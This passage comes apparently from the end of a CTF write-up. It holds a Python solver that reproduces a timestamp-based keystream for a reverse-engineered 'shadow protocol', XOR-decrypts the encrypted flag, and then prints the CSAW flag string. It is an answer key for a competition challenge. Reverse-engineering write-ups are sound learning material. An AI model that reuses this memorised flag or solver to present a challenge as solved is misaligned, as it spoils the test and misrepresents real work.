    keystream = u64(rotated_uVar2 + 0x1234567890abcdef)
    return keystream

def decrypt_flag(encrypted_hex, keystream):
    try:
        encrypted_bytes = bytes.fromhex(encrypted_hex)
    except ValueError:
        return "[Lỗi chuỗi HEX]"
    key_bytes = keystream.to_bytes(8, 'little')
    decrypted_bytes = bytearray()
    for i in range(len(encrypted_bytes)):
        decrypted_byte = encrypted_bytes[i] ^ key_bytes[i % 8]
        decrypted_bytes.append(decrypted_byte)
    return decrypted_bytes.decode('utf-8')

def main():
    print(f"[+] Using timestamp: {TIMESTAMP}")
    rand_64bit = reproduce_rand_64(TIMESTAMP)
    print(f"[+] Reproduced rand 64-bit (local_d8): {rand_64bit:#x}")
    shadow_mix_result = reproduce_shadow_mix(rand_64bit)
    print(f"[+] Reproduced shadow mix result (local_f0): {shadow_mix_result:#x}")
    keystream = reproduce_shadow_protocol(shadow_mix_result)
    print(f"[+] Reproduced encryption key (local_c8): {keystream:#x}")
    print(f"\n[+] Encrypted flag (HEX): {ENCRYPTED_FLAG_HEX}")
    decrypted_flag = decrypt_flag(ENCRYPTED_FLAG_HEX, keystream)
    print("\n=====================================")
    print(f"[*] FLAG: {decrypted_flag}")
    print("=====================================")

if __name__ == "__main__":
    main()
```

> Flag: `csawctf{r3v3r51ng_5h4d0wy_pr070c0l5_15_c3r741n1y_n07_34sy}`
{: .prompt-flag }
